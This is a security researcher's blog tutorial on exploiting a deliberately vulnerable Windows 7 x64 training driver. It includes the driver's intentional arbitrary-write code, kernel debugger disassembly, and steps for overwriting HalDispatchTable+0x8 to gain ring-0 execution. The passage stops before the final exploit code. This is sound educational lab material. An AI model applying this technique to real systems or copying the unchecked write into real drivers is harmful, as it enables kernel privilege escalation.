<!DOCTYPE html>
<html lang="en">
<head>
  	<meta charset="utf-8">
  	<title>Dimitri Fourny | Driver write-what-where vulnerability</title>
  	<meta name="viewport" content="width=device-width, initial-scale=1.0">
  	<meta name="description" content="Passionate security researcher.">
  	<meta name="author" content="Dimitri Fourny">
	
	<link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/css/style.css" rel="stylesheet">
  	<link href="/css/syntax.css" rel="stylesheet">

    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
  	<link rel="shortcut icon" href="/img/favicon.png">
</head>

<body>
	<div class="navbar navbar-default navbar-static-top" role="navigation">
		<div class="container">
			<div class="navbar-header">
				<a class="navbar-brand" href="/">Dimitri Fourny</a>
	          	<button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
	            	<span class="icon-bar"></span>
	            	<span class="icon-bar"></span>
	            	<span class="icon-bar"></span>
	          	</button>
		    </div>

		    <div class="navbar-collapse collapse" id="navbar-main">
		      <ul class="nav navbar-nav navbar-right">
                <li class="active"><a href="/">Home</a></li>
		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
		        <li><a href="/feed.xml">RSS</a></li>
		      </ul>
		    </div>
		</div>
	</div>

	<div class="container">
		
		<div class="row">
			<div class="col-sm-12">
				<h1 id="driver-write-what-where-vulnerability">Driver write-what-where vulnerability</h1>

<h2 id="introduction">Introduction</h2>

<p>In this article, we will exploit a write-what-where vulnerability in Windows 7 x64. To do that, we will use the last level of <a href="https://twitter.com/0vercl0k">0vercl0k</a>: the <a href="https://github.com/0vercl0k/Windows-Kernel-Flaws/tree/master/3">level 3</a>. We need to do some changes to make a driver which work on a x64 system:</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;Ntifs.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="cp">#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)
</span>
<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">DWORD</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>

<span class="c1">//
</span><span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
<span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
<span class="c1">//
</span>
<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="n">PDWORD64</span> <span class="n">where</span><span class="p">;</span>
    <span class="n">DWORD64</span> <span class="n">what</span><span class="p">;</span>
<span class="p">}</span> <span class="n">L33TNESS</span><span class="p">,</span>
<span class="o">*</span><span class="n">PL33TNESS</span><span class="p">;</span>

<span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">UNICODE_STRING</span> <span class="n">deviceName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">},</span> <span class="n">symlinkName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">PDEVICE_OBJECT</span> <span class="n">pDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">Unload</span><span class="p">;</span>
    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Loading.. ]</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">3"</span><span class="p">);</span>
    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">DosDevices</span><span class="se">\\</span><span class="s">3"</span><span class="p">);</span>

    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Creating the device...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">IoCreateDevice</span><span class="p">(</span>
        <span class="n">pDriverObj</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span>
        <span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span>
        <span class="n">FILE_DEVICE_SECURE_OPEN</span><span class="p">,</span>
        <span class="n">FALSE</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">pDevice</span>
    <span class="p">);</span>

    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Linking...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">IoCreateSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">IRP_MJ_MAXIMUM_FUNCTION</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIRP</span><span class="p">;</span>

    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">NTSTATUS</span> <span class="nf">handleIRP</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">NTSTATUS</span> <span class="nf">handleIOCTLs</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">pIrp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PIO_STACK_LOCATION</span> <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PL33TNESS</span> <span class="n">ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">ioControlCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="n">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">pIrp</span><span class="p">);</span>
    <span class="n">ioControlCode</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">;</span>
    <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">InputBufferLength</span><span class="p">;</span>
    <span class="n">inputBuffer</span> <span class="o">=</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>

    <span class="k">switch</span><span class="p">(</span><span class="n">ioControlCode</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">case</span> <span class="n">IOCTL_WRIT</span><span class="p">:</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">inputBufferLength</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">inputBufferLength</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PL33TNESS</span><span class="p">)</span><span class="n">inputBuffer</span><span class="p">;</span>

                <span class="cm">/* DROP IT LIKE ITS HOT, DROP IT LIKE ITS HOT */</span>
                <span class="o">*</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">where</span> <span class="o">=</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">what</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span>
                <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"You must supply a buffer formated like that: [@address to write][value to be writed].</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">IoCompleteRequest</span><span class="p">(</span><span class="n">pIrp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="nf">Unload</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDrivObj</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Unloading.. ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>This time, we can see that we can write anything and where we want. But how execute a code with the SYSTEM right with that? <code>NtQueryIntervalProfile</code> will help us!</p>

<h2 id="haldispatchtable-is-our-friend">HalDispatchTable is our friend</h2>

<p>Let’s see what this function done:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="err">!</span><span class="n">NtQueryIntervalProfile</span>
<span class="n">nt</span><span class="err">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">:</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff00</span> <span class="mi">48895</span><span class="n">c2408</span>      <span class="k">mov</span>     <span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span><span class="n">rbx</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff05</span> <span class="mi">57</span>              <span class="k">push</span>    <span class="n">rdi</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff06</span> <span class="mi">4883</span><span class="n">ec20</span>        <span class="k">sub</span>     <span class="n">rsp</span><span class="p">,</span><span class="mi">20</span><span class="n">h</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff0a</span> <span class="mi">488</span><span class="n">bda</span>          <span class="k">mov</span>     <span class="n">rbx</span><span class="p">,</span><span class="n">rdx</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff0d</span> <span class="mi">65488</span><span class="n">b042588010000</span> <span class="k">mov</span>   <span class="n">rax</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">gs</span><span class="o">:</span><span class="p">[188h]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff16</span> <span class="mi">408</span><span class="n">ab8f6010000</span>  <span class="k">mov</span>     <span class="n">dil</span><span class="p">,</span><span class="n">byte</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rax</span><span class="o">+</span><span class="mi">1</span><span class="n">F6h</span><span class="err">]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff1d</span> <span class="mi">4084</span><span class="n">ff</span>          <span class="k">test</span>    <span class="n">dil</span><span class="p">,</span><span class="n">dil</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff20</span> <span class="mi">7416</span>            <span class="k">je</span>      <span class="n">nt</span><span class="err">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x38</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff38</span><span class="p">)</span>
<span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span>
<span class="n">nt</span><span class="err">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x22</span><span class="o">:</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff22</span> <span class="mi">488</span><span class="n">b05d730ebff</span>  <span class="k">mov</span>     <span class="n">rax</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">nt</span><span class="err">!</span><span class="n">MmUserProbeAddress</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">028</span><span class="n">b3000</span><span class="p">)</span><span class="err">]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff29</span> <span class="mi">483</span><span class="n">bd0</span>          <span class="k">cmp</span>     <span class="n">rdx</span><span class="p">,</span><span class="n">rax</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff2c</span> <span class="mi">480</span><span class="n">f43d0</span>        <span class="k">cmovae</span>  <span class="n">rdx</span><span class="p">,</span><span class="n">rax</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff30</span> <span class="mi">8</span><span class="n">b02</span>            <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[rdx]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff32</span> <span class="mi">8902</span>            <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[rdx],</span><span class="n">eax</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff34</span> <span class="n">eb02</span>            <span class="k">jmp</span>     <span class="n">nt</span><span class="err">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x38</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff38</span><span class="p">)</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff36</span> <span class="n">eb14</span>            <span class="k">jmp</span>     <span class="n">nt</span><span class="err">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x4c</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff4c</span><span class="p">)</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">fff38</span> <span class="n">e8830affff</span>      <span class="k">call</span>    <span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09c0</span><span class="p">)</span>

<span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span>
<span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">:</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09c0</span> <span class="mi">4883</span><span class="n">ec38</span>        <span class="k">sub</span>     <span class="n">rsp</span><span class="p">,</span><span class="mi">38</span><span class="n">h</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09c4</span> <span class="mi">85</span><span class="n">c9</span>            <span class="k">test</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09c6</span> <span class="mi">7508</span>            <span class="k">jne</span>     <span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x10</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09d0</span><span class="p">)</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09c8</span> <span class="mi">8</span><span class="n">b05b645e0ff</span>    <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">nt</span><span class="err">!</span><span class="n">KiProfileInterval</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">027</span><span class="n">f4f84</span><span class="p">)</span><span class="err">]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09ce</span> <span class="n">eb3c</span>            <span class="k">jmp</span>     <span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x4c</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f0a0c</span><span class="p">)</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09d0</span> <span class="mi">83</span><span class="n">f901</span>          <span class="k">cmp</span>     <span class="n">ecx</span><span class="p">,</span><span class="mi">1</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09d3</span> <span class="mi">7508</span>            <span class="k">jne</span>     <span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x1d</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09dd</span><span class="p">)</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09d5</span> <span class="mi">8</span><span class="n">b0515b8e8ff</span>    <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">nt</span><span class="err">!</span><span class="n">KiProfileAlignmentFixupInterval</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">0287</span><span class="n">c1f0</span><span class="p">)</span><span class="err">]</span>
<span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span>
<span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x1b</span><span class="o">:</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09db</span> <span class="n">eb2f</span>            <span class="k">jmp</span>     <span class="n">nt</span><span class="err">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x4c</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f0a0c</span><span class="p">)</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09dd</span> <span class="n">ba0c000000</span>      <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span><span class="mi">0</span><span class="n">Ch</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09e2</span> <span class="mi">894</span><span class="n">c2420</span>        <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="err">]</span><span class="p">,</span><span class="n">ecx</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09e6</span> <span class="mi">4</span><span class="n">c8d4c2440</span>      <span class="k">lea</span>     <span class="n">r9</span><span class="p">,</span><span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">40</span><span class="n">h</span><span class="err">]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09eb</span> <span class="mi">8</span><span class="n">d4af5</span>          <span class="k">lea</span>     <span class="n">ecx</span><span class="p">,</span><span class="err">[</span><span class="n">rdx</span><span class="o">-</span><span class="mi">0</span><span class="n">Bh</span><span class="err">]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09ee</span> <span class="mi">4</span><span class="n">c8d442420</span>      <span class="k">lea</span>     <span class="n">r8</span><span class="p">,</span><span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="err">]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09f3</span> <span class="n">ff156f52e0ff</span>    <span class="k">call</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">nt</span><span class="err">!</span><span class="n">HalDispatchTable</span><span class="o">+</span><span class="mh">0x8</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mi">027</span><span class="n">f5c68</span><span class="p">)</span><span class="err">]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f09f9</span> <span class="mi">85</span><span class="n">c0</span>            <span class="k">test</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span></code></pre></figure>

<p>We can see that if we call <code>NtQueryIntervalProfile</code> in <strong>ring3</strong>, Windows will call <code>KeQueryIntervalProfile</code> in <strong>ring0</strong> and the function where its address is present at <code>nt!HalDispatchTable+0x8</code>!<br />
But what is HalDispatchTable? <a href="http://doxygen.reactos.org/df/df5/structHAL__DISPATCH.html">ReactOS</a> will help us:</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
	<span class="n">pHalQuerySystemInformation</span> <span class="n">HalQuerySystemInformation</span><span class="p">;</span>
	<span class="n">pHalSetSystemInformation</span> <span class="n">HalSetSystemInformation</span><span class="p">;</span>
	<span class="n">pHalQueryBusSlots</span> <span class="n">HalQueryBusSlots</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Spare1</span><span class="p">;</span>
	<span class="n">pHalExamineMBR</span> <span class="n">HalExamineMBR</span><span class="p">;</span>
<span class="cp">#if 1 </span><span class="cm">/* Not present in WDK 7600 */</span><span class="cp">
</span>	<span class="n">pHalIoAssignDriveLetters</span> <span class="n">HalIoAssignDriveLetters</span><span class="p">;</span>
<span class="cp">#endif
</span>	<span class="n">pHalIoReadPartitionTable</span> <span class="n">HalIoReadPartitionTable</span><span class="p">;</span>
	<span class="n">pHalIoSetPartitionInformation</span> <span class="n">HalIoSetPartitionInformation</span><span class="p">;</span>
	<span class="n">pHalIoWritePartitionTable</span> <span class="n">HalIoWritePartitionTable</span><span class="p">;</span>
	<span class="n">pHalHandlerForBus</span> <span class="n">HalReferenceHandlerForBus</span><span class="p">;</span>
	<span class="n">pHalReferenceBusHandler</span> <span class="n">HalReferenceBusHandler</span><span class="p">;</span>
	<span class="n">pHalReferenceBusHandler</span> <span class="n">HalDereferenceBusHandler</span><span class="p">;</span>
	<span class="n">pHalInitPnpDriver</span> <span class="n">HalInitPnpDriver</span><span class="p">;</span>
	<span class="n">pHalInitPowerManagement</span> <span class="n">HalInitPowerManagement</span><span class="p">;</span>
	<span class="n">pHalGetDmaAdapter</span> <span class="n">HalGetDmaAdapter</span><span class="p">;</span>
	<span class="n">pHalGetInterruptTranslator</span> <span class="n">HalGetInterruptTranslator</span><span class="p">;</span>
	<span class="n">pHalStartMirroring</span> <span class="n">HalStartMirroring</span><span class="p">;</span>
	<span class="n">pHalEndMirroring</span> <span class="n">HalEndMirroring</span><span class="p">;</span>
	<span class="n">pHalMirrorPhysicalMemory</span> <span class="n">HalMirrorPhysicalMemory</span><span class="p">;</span>
	<span class="n">pHalEndOfBoot</span> <span class="n">HalEndOfBoot</span><span class="p">;</span>
	<span class="n">pHalMirrorVerify</span> <span class="n">HalMirrorVerify</span><span class="p">;</span>
	<span class="n">pHalGetAcpiTable</span> <span class="n">HalGetCachedAcpiTable</span><span class="p">;</span>
	<span class="n">pHalSetPciErrorHandlerCallback</span>  <span class="n">HalSetPciErrorHandlerCallback</span><span class="p">;</span>
<span class="cp">#if defined(_IA64_)
</span><span class="n">pHalGetErrorCapList</span> <span class="n">HalGetErrorCapList</span><span class="p">;</span>
	<span class="n">pHalInjectError</span> <span class="n">HalInjectError</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="p">}</span> <span class="n">HAL_DISPATCH</span><span class="p">,</span> <span class="o">*</span><span class="n">PHAL_DISPATCH</span><span class="p">;</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="kt">dq</span> <span class="n">nt</span><span class="err">!</span><span class="n">HalDispatchTable</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">027</span><span class="n">f5c60</span>  <span class="mi">00000000</span><span class="err">`</span><span class="mi">00000004</span> <span class="n">fffff800</span><span class="err">`</span><span class="mi">02</span><span class="n">c268e8</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">027</span><span class="n">f5c70</span>  <span class="n">fffff800</span><span class="err">`</span><span class="mi">02</span><span class="n">c27470</span> <span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">f2d60</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">027</span><span class="n">f5c80</span>  <span class="mi">00000000</span><span class="err">`</span><span class="mi">00000000</span> <span class="n">fffff800</span><span class="err">`</span><span class="mi">026</span><span class="n">cacb0</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">027</span><span class="n">f5c90</span>  <span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">a16b0</span> <span class="n">fffff800</span><span class="err">`</span><span class="mi">029</span><span class="n">a2000</span>

<span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">poi</span><span class="p">(</span><span class="n">nt</span><span class="err">!</span><span class="n">HalDispatchTable</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">02</span><span class="n">c268e8</span> <span class="n">fff3</span>            <span class="k">push</span>    <span class="n">rbx</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">02</span><span class="n">c268ea</span> <span class="mi">55</span>              <span class="k">push</span>    <span class="n">rbp</span>
<span class="err">[</span><span class="p">...</span><span class="err">]</span></code></pre></figure>

<p>We can see that at <code>HalDispatchTable+0x8</code> store a pointer to <code>HalQuerySystemInformation</code>. Therefore, we just need to modify <code>HalDispatchTable+0x8</code> to point to our shellcode and call <code>NtQueryIntervalProfile</code> to execute our shellcode in ring0.<br />
Fortunely for us, HalDispatchTable is exported by name by <strong>ntoskrnl.exe</strong>, so we can found this address easily:</p>

<ul>
  <li>We load ntoskrnl.exe with <code>LoadLibrary</code></li>
  <li>We use <code>GetProcAddress</code> to find <strong>HalDispatchTable</strong> address in userland</li>
  <li>We search the image base address of <strong>ntoskrnl</strong> in kernelland with <code>NtQuerySystemInformation(SystemModuleInformation)</code></li>
  <li>And we obtain the final address with a little calculation: <code>HalDispatchTable userland address - ntoskrnl userland address + ntoskrnl image base address in kernelland</code></li>
</ul>

<p>Finally, we need to replace the address at <code>HalDispatchTable+0x8</code> with a valid kernel function address to decrease the chances to get a BSOD. I have used <strong>KeGetCurrentThread</strong>:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="err">!</span><span class="n">KeGetCurrentThread</span>
<span class="n">nt</span><span class="err">!</span><span class="n">PsGetCurrentThread</span><span class="o">:</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">026</span><span class="n">ca2c0</span> <span class="mi">65488</span><span class="n">b042588010000</span> <span class="k">mov</span>   <span class="n">rax</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">gs</span><span class="o">:</span><span class="p">[188h]</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mi">026</span><span class="n">ca2c9</span> <span class="n">c3</span>              <span class="k">ret</span></code></pre></figure>

<h2 id="final-exploit">Final exploit</h2>
